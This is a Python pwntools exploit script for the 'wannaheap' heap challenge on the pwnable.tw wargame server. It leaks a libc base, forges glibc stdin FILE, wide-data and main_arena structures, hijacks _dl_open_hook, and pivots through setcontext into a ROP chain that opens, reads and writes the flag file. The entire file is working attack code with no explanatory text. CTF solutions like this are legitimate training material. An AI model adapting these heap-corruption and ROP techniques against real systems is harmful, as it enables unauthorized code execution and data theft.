from pwn import *

context.os = 'linux'
context.arch = 'amd64'

class exploit(object):
    def __init__(self):
        super(exploit, self).__init__()
        self.r = None
        self.libc = ELF('libc.so')
        self.elf= ELF("wannaheap")
        self.stdin_IO_buf_base_offset = 0x314000 + self.libc.symbols['_IO_2_1_stdin_'] + 56 - 0x10 
        self.index = 1

    def alloc(self, data):
        self.r.sendlineafter(b'>', b'A')
        self.r.sendlineafter(b':', str(self.index).encode())
        self.r.sendafter(b':', data)      

    def read(self, index):
        self.r.sendlineafter(b'>', b'R')
        self.r.sendlineafter(b':', index)

    def main(self):
        while True:
            try:
                self.r = remote('chall.pwnable.tw', 10305)
                self.index = 1

                self.r.sendlineafter(b'Size :', str(self.stdin_IO_buf_base_offset).encode())
                self.r.sendlineafter(b'Size :', str(0x313370).encode())
                self.r.sendafter(b'Content :', b'wannaheap')
                self.alloc(b'a'*8)
                self.index += 1
                self.alloc(b'a'*9)
                self.read(b'2')
                self.r.recvuntil(b'data : ')
                self.libc.address = (u64(self.r.recv()[8:14] + b'\x00\x00')&0xffffffffffffff00) - self.libc.symbols['_IO_2_1_stdout_']
                log.info(f'libc base: 0x{self.libc.address}')

                # ****************_IO_2_1_stdin_********************
                tmp = p64(((self.libc.address + 0x3C1900 + 0x132)&0xffffffffffffff00) + 0x341)
                self.r.send(tmp)
                self.r.send(b'D'*24)
                payload = tmp
                payload += p64(0)*6
                payload += p64(0xffffffffffffffff)
                payload += p64(0x000000000a000000)
                payload += p64(self.libc.address + 0x3C3770)
                payload += p64(0xffffffffffffffff)
                payload += p64(0)
                payload += p64(self.libc.address + 0x3C19A0)
                payload += p64(0)*3
                payload += p64(0xffffffff)
                payload += p64(0)*2
                payload += p64(self.libc.address + 0x3BE400)
                # ****************_IO_wide_data_********************
                payload += p64(0)
                payload += p64(0x510)
                payload += p64(self.libc.symbols['_dl_open_hook'] - 0x10)
                payload += p64(self.libc.symbols['_dl_open_hook'] - 0x10)

                payload += p64(0x0)*34
                payload += p64(self.libc.address + 0x3BDEC0)
                payload += p64(0x0)*3
                payload += p64(0x0)*2 #malloc_hook
                # ****************main_arena!********************
                payload += p64(0x100000000)
                payload += p64(0x00)*10
                payload += p64(self.libc.address + 0x6ebbb)
                payload += p64(0x00)
                payload += p64(self.libc.address + 0x3C19A0)
                payload += p64(self.libc.address + 0x3C19A0)
                payload += p64(self.libc.symbols['setcontext'] + 53)            
                payload += p64(0x0)*15
                payload += p64(self.libc.address + 0x3C1B00 + 0x100)                    #rdi main_arena + 88 ; rsp
                payload += p64(self.libc.address + 0x937)                               #ret

                poprsi = self.libc.address + 0x1fcbd 
                poprdi = self.libc.address + 0x1fd7a
                poprdx = self.libc.address + 0x1b92
                open64 = self.libc.symbols['open64']
                read = self.libc.symbols['read']
                write = self.libc.symbols['write']

                open_ = p64(poprdi) + p64(self.libc.address + 0x3C1B00 + 0x170) + p64(open64)
                read_ = p64(poprdi) + p64(0x1) + p64(poprsi) + p64(self.libc.address + 0x3C1B00 + 0x220) + p64(poprdx) + p64(0x100) + p64(read)
                write_ = p64(poprdi) + p64(0x0) + p64(write)

                rop = open_
                rop += read_
                rop += write_
                rop += (0x100 - 22*8 - len(rop))*b'\x00' + b'/home/wannaheap/flag\x00'
                self.r.send(payload)
                self.r.sendline(rop)

                self.r.interactive()
            except KeyboardInterrupt:
                print('Interrupted')
                self.r.close()
                sys.exit(0)
            except:
                self.r.close()
                continue

ex = exploit()
ex.main()